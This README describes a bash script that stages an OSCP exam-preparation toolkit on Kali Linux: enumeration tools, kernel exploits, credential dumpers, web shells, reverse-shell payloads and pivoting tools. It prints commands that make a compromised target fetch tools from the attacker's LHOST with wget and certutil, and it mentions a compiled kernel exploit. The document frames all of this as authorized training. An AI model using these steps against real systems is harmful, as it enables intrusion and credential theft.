# OSCP Toolkit Setup

This is a bash script (`oscp-toolkit-setup-v6.5.sh`) that stages a complete, offline privilege-escalation and post-exploitation toolkit on a Kali attacker box for **OSCP / PEN-200 exam preparation and the exam itself**.

It downloads, extracts, and organizes the standard publicly available offensive-security tools, pre-generates reverse-shell payloads, and writes cheatsheet/method templates, so that during a time-boxed exam you are transferring known-good binaries to targets instead of hunting for them.

## Intended use

This toolkit is for **authorized use only**: the OffSec OSCP exam and PEN-200 lab environment, your own practice labs (Proving Grounds, HackTheBox, personal VMs), or engagements where you have explicit written permission. 

Every tool it stages is publicly available and used against isolated, authorized targets. Do not point any of it at systems you do not own or are not contracted to test.

It also ships an `EXAM-RESTRICTED-TOOLS.txt` reminder of OffSec's exam rules (see "Exam compliance" below).

## What it stages

The script creates a toolkit tree (default `~/privesc-toolkit`) and populates these categories:

**Linux**
- Enumeration: LinPEAS, linux-smart-enumeration (lse), LinEnum, linux-exploit-suggester, unix-privesc-check (staged from the Kali package as a low-priority cross-check)
- Process monitoring: pspy
- Networking / shells: static busybox, netcat helpers
- Kernel exploits: DirtyPipe, PwnKit, and CopyFail (CVE-2026-31431) proof-of-concept, hash-verified
- Pivoting: chisel, ligolo-ng proxy/agent

**Windows**
- Enumeration: WinPEAS, PrivescCheck, PowerUp, Seatbelt, SharpUp, accesschk (official signed Sysinternals build)
- Privilege escalation: GodPotato, PrintSpoofer, JuicyPotato / JuicyPotatoNG, RoguePotato, SigmaPotato, FullPowers
- Credential dumping: mimikatz, LaZagne, KeePass and McAfee sitelist decryptors
- Active Directory: Rubeus, Certify, kerbrute, SharpHound / BloodHound CE, plus SharpCollection (a nightly-built superset of the .NET binaries across runtimes)
- Networking / shells: nc64, Invoke-PowerShellTcp, Invoke-ConPtyShell (fully interactive PTY for shell stabilization), PsExec64 (official signed Sysinternals build)
- Pivoting: chisel and ligolo-ng agents

**Web / attacker-side**
- Web shells in multiple languages (php, phtml, phar, aspx, asp, jsp)
- Templates: SQLi checklist, LFI payloads, upload-bypass filenames, command-injection probes, and XXE / SSRF payload references
- Service cheatsheets (finger, MySQL/MariaDB, and others)
- proxychains config template, msfvenom payload helpers, BloodHound CE Docker/CLI helper

## Requirements

- Kali Linux 
- Internet access 
- `git`, `curl`, `unzip`, `python3` 
- Optional but recommended: `docker` (for BloodHound CE), `msfvenom` (for pre-generated payloads), `x86_64-w64-mingw32-gcc` (to compile the included C helpers)

Impacket is expected to come from the Kali `python3-impacket` package rather than pip, to avoid version conflicts.

## Install and usage

```bash
# 1. Make it executable
chmod +x oscp-toolkit-setup-v6.5.sh

# 1.5 Execute without parameters
./oscp-toolkit-setup-v6.5.sh

# 2. Pass your VPN tun0 IP (LHOST) and preferred callback port (LPORT)
./oscp-toolkit-setup-v6.5.sh 192.168.45.200 443
```

`LHOST` and `LPORT` are positional arguments. `LHOST` seeds the pre-generated payloads and the cheatsheets; if you leave it as the default `CHANGEME`, payload generation is skipped so you never bake in a wrong address.

The ip address and port should feed the pre-generated shell payloads and cheatsheet templates back at your kali ip. If you leave it blank, the script will SKIP THE PAYLOAD GENERATION. 

### SCRIPT Flags

- `--dry-run` validate the whole flow and print every action without downloading, extracting, or installing
- `--strict` stop at the first failed download or install instead of continuing past it
- `--skip-pip` skip pip installs
- `--skip-gem` skip gem installs
- `--skip-clone` skip git-cloning source repositories
- `-h`, `--help` show usage

### Overriding defaults

Environment variables let you change the destination and pinned versions without editing the script:

```bash
TOOLKIT=~/exam-kit CHISEL_VER=1.11.7 LIGOLO_VER=0.8.3 ./oscp-toolkit-setup-v6.5.sh 192.168.45.200 443
```

Default toolkit directory is `~/privesc-toolkit`. Current pinned versions are chisel 1.11.7 and ligolo-ng 0.8.3.

## Serving tools to targets

Once staged, serve the toolkit over HTTP and pull individual tools onto a compromised host:

```bash
cd ~/privesc-toolkit
python3 -m http.server 8000
```

On the target:

```bash
# Linux
wget http://<LHOST>:8000/linux/linpeas.sh -O /tmp/linpeas.sh

# Windows
certutil -urlcache -f http://<LHOST>:8000/windows/winPEASx64.exe winpeas.exe
```

The generated `README-FIRST` file inside the toolkit lists the most-used target-side URLs and a suggested workflow.

## Verification

After a real run, the script writes a `MANIFEST.sha256` and a `file-types.txt`. Check `file-types.txt` to confirm binaries downloaded as real executables (PE32 / ELF) rather than error pages or HTML redirects, and use the manifest to spot any zero-byte or failed downloads. A "Failed downloads/actions" summary prints at the end if anything did not complete.

## Security and trust caveat

CopyFail's proof-of-concept is hash-pinned and verified on download. Most other binaries are pulled from their upstream project repositories without per-file hash pinning, and a few come from well-known community-maintained repos (for example precompiled .NET and netcat binaries). This is standard for exam prep and acceptable against isolated lab targets, but be aware you are trusting those upstreams. The post-run manifest records hashes but does not compare them against a known-good baseline.

### dfold

I compiled dirty frag https://github.com/v4bel/dirtyfrag on an older kernel which worked on some PGP boxes. This will work on older machines. However, please use with caution and only on authorized machines/targets.